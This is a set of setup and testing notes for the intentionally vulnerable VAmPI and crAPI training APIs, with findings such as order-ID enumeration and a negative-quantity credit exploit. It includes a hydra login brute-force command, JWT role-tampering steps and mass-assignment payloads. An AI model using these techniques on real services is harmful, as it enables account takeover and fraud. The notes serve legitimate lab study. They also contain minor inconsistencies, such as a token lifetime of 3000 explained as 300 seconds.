# API Penetration Testing Lab Setup

This document covers the setup and testing notes for two intentionally vulnerable APIs used for practicing API penetration testing: **VAmPI** and **crAPI**.

---

# VAmPI

## VAmPI – Lab Setup & Testing Guide

**Repository:** https://github.com/erev0s/VAmPI

VAmPI = **Vulnerable API** built in Flask.
It is intentionally designed to demonstrate **OWASP API Security Top 10 vulnerabilities** in a clean REST architecture.

> VAmPI is a vulnerable API made with Flask and it includes vulnerabilities from the OWASP Top 10 vulnerabilities for APIs. It includes a switch on/off to allow the API to be vulnerable or not while testing (useful for false positive/negative test coverage). It can also be used for learning/teaching purposes.

**Features**
- Based on OWASP Top 10 vulnerabilities for APIs
- OpenAPI3 specs and Postman Collection included
- Global switch on/off to have a vulnerable environment or not
- Token-Based Authentication (adjustable lifetime from within `app.py`)
- Available Swagger UI to directly interact with the API

---

## 1. Installation Methods

### Clone + Docker Compose

```bash
mkdir -p /opt/VAmPI
cd /opt/VAmPI
```

### Run Vulnerable VAmPI Container

Start the vulnerable VAmPI container:

```bash
docker run -d \
  -e vulnerable=1 \
  -e tokentimetolive=3000 \
  -p 5000:5000 \
  erev0s/vampi:latest
```

### Environment Variable Explanation

```bash
-e tokentimetolive=3000
```

**Breakdown:**
- `-e` → sets an environment variable
- `tokentimetolive` → variable name
- `300` → value in seconds (token valid for 5 minutes)

**Meaning:** Authentication tokens expire after **300 seconds**.

### (Alternative) Clone + Docker Compose

```bash
cd /opt
git clone https://github.com/erev0s/VAmPI.git
cd /opt/VAmPI
docker-compose up -d
```

**Verify:**

```bash
docker ps
netstat -nltup
```

---

## 2. Access URLs

If your IP is `192.168.1.28`:

| URL | Purpose |
|-----|---------|
| http://192.168.1.28:5001 | API Root |
| http://192.168.1.28:5001/ui/ | Swagger UI |

### Access the API

The VAmPI service will be available at:

```
http://<IP>:5000
```

### Initialize Database

Create the database using:

```
/createdb
```

Example:

```
http://<IP>:5000/createdb
```

**Next Steps**
- Create a user
- Authenticate (get token)
- Start testing / exploiting vulnerabilities

Verify:
```bash
docker ps
netstat -nltup
```

> Swagger UI is extremely useful for recon.

---

## 3. Architecture Overview

VAmPI is:
- REST API
- Flask-based
- JWT Authentication
- Single container (simpler than crAPI)
- SQLite/Postgres (depending on config)

Unlike crAPI (microservices), VAmPI is monolithic — ideal for learning core API flaws.

---

## 4. Initial Recon Strategy

### Step 1 – Swagger Enumeration

Visit:
```
http://192.168.1.103:5000/ui/
```

Check:
- All endpoints
- Required parameters
- Authentication requirements
- Response schema

This gives a complete attack surface.

### Step 2 – Identify Authentication Flow

Usually:
```
POST /users/v1/login
POST /users/v1/register
```

Capture JWT and inspect:
- Header
- Payload
- Signature

---

## 5. Common Vulnerabilities in VAmPI

VAmPI intentionally contains:

### 1. Broken Object Level Authorization (BOLA)

Example:
```
GET /users/v1/users/1
GET /users/v1/users/2
```

Change user ID → check if data leaks.

### 2. JWT Weakness

Check:
- Hardcoded secret in source
- Weak signing algorithm
- Role tampering

Try:
- Modify `role: admin`
- Change `user_id`
- Re-sign token if secret is known

### 3. Mass Assignment

When creating or updating user:

```json
{
  "username": "rahul",
  "password": "test",
  "admin": true
}
```

Try adding hidden fields like:
- `is_admin`
- `role`
- `balance`

### 4. Excessive Data Exposure

API might return:

```json
{
  "id": 1,
  "username": "admin",
  "password": "hashedvalue",
  "secret_key": "..."
}
```

Look for:
- Internal fields
- Debug information
- Unnecessary sensitive data

### 5. Brute Force / Weak Auth (credential stuffing example)

```bash
hydra -X POST -d '{ "username": "admin", "password": "FUZZ" }' \
  -u http://192.168.1.103:5001/users/v1/login \
  -w rockyou.txt
```

Check:
- Account lockout?
- Rate limiting?
- Response difference?

### 6. Injection Testing

Test:
- SQL injection in parameters
- Command injection in search fields
- JSON injection

---

## 6. Recommended Pentest Flow (Professional Approach)

Since you're building an API pentesting workflow, use this order:

1. Swagger Recon
2. Register account
3. Capture JWT
4. Test:
   - BOLA
   - Role tampering
   - ID enumeration
5. Test mass assignment
6. Test rate limiting
7. Test injection
8. Analyze error handling

---

## 7. VAmPI vs vapi vs crAPI

| Feature | vapi | VAmPI | crAPI |
|---------|------|-------|-------|
| Difficulty | Low | Medium | High |
| JWT Focus | Limited | Strong | Advanced |
| Microservices | No | No | Yes |
| Business Logic | Minimal | Moderate | Advanced |
| Swagger | No | Yes | Partial |

VAmPI is perfect for:
- JWT exploitation practice
- BOLA mastery
- Learning API authorization flaws

---

## 8. Map to OWASP API Security Top 10 (2023)

VAmPI covers:
- Broken Object Level Authorization
- Broken Authentication
- Excessive Data Exposure
- Mass Assignment
- Security Misconfiguration
- Lack of Rate Limiting

---

## 9. Advanced Mode

If you want deeper learning:
- Read source code (`app.py`, `config.py`)
- Identify hardcoded secrets
- Trace authorization decorators
- Understand how JWT is validated

Then exploit based on logic flaws instead of blind testing.

---

# crAPI

crAPI is a more complex, microservices-based vulnerable API application (used as a comparison target — see table above). Observed vulnerabilities during testing of the **Shop** module:

## Vulnerability 1: Broken Object Level Authorization on Orders (BOLA)

Request:
```
GET /workshop/api/shop/orders/1
```

Returns another user's full order and payment details, including PII and partial card data:

```json
{
  "order": {
    "id": 1,
    "user": {
      "email": "adam007@example.com",
      "number": "9876895423"
    },
    "product": {
      "id": 1,
      "name": "Seat",
      "price": "10.00",
      "image_url": "images/seat.svg"
    },
    "quantity": 2,
    "status": "delivered",
    "transaction_id": "0ca1209d-2959-4ee3-9d9a-49535a46850d",
    "created_on": "2026-03-21T12:45:47.173733"
  },
  "payment": {
    "transaction_id": "0ca1209d-2959-4ee3-9d9a-49535a46850d",
    "order_id": 1,
    "amount": 20,
    "paid_on": "2026-03-21T12:45:47.173733",
    "card_number": "XXXXXXXXXXXX9541",
    "card_owner_name": "Adam",
    "card_type": "Visa",
    "card_expiry": "12/2027",
    "currency": "USD"
  }
}
```

Impact: an authenticated user can enumerate `order_id` and view other users' order + payment information (PII / partial financial data exposure).

## Vulnerability 2: Business Logic Flaw – Negative Quantity Purchase (Balance Manipulation)

Endpoint:
```
POST /workshop/api/shop/orders
```

Normal request:
```json
{
  "product_id": 2,
  "quantity": -100
}
```

Response:
```json
{
  "id": 8,
  "message": "Order sent successfully.",
  "credit": 1080.0
}
```

Submitting a **negative quantity** increases the user's available balance instead of deducting it (starting balance was $80/$90 before the request).

Repeating with a larger negative value:
```json
{
  "product_id": 2,
  "quantity": -1000
}
```

Response:
```json
{
  "id": 9,
  "message": "Order sent successfully.",
  "credit": 11080.0
}
```

Confirmed on the Shop page — balance jumped from **$80 → $11,080**.

**Root cause:** No server-side validation of `quantity` (missing check for `quantity > 0`), allowing arbitrary credit/balance inflation — a business logic / input validation flaw (OWASP API — Unrestricted Resource Consumption / Broken Function Level Authorization category, business logic abuse).

**Impact:** A malicious user can generate unlimited store credit and purchase products for free.

## Vulnerability 3: Missing Delete Option for Uploaded Media (Minor / UX-Security issue)

On "My Personal Video" upload feature, once a video is uploaded there is no option to delete it from the "Manage Video" menu — only manage/replace options were visible. This may indicate missing functionality for users to remove personal data (potential data-retention / privacy concern).

---

## Summary of Findings

| App | Vulnerability | Type | Severity |
|-----|---------------|------|----------|
| VAmPI | BOLA on `/users/v1/users/{id}` | Broken Object Level Authorization | High |
| VAmPI | Mass Assignment (`admin: true`) | Mass Assignment | High |
| VAmPI | Excessive Data Exposure (password hash, secret_key) | Data Exposure | Medium |
| VAmPI | Weak/hardcoded JWT secret | Broken Authentication | High |
| VAmPI | No rate limiting on login | Lack of Rate Limiting | Medium |
| crAPI | BOLA on `/workshop/api/shop/orders/{id}` | Broken Object Level Authorization | High |
| crAPI | Negative quantity → balance manipulation | Business Logic Flaw | Critical |
| crAPI | No delete option for uploaded video | Data Retention / Privacy | Low |
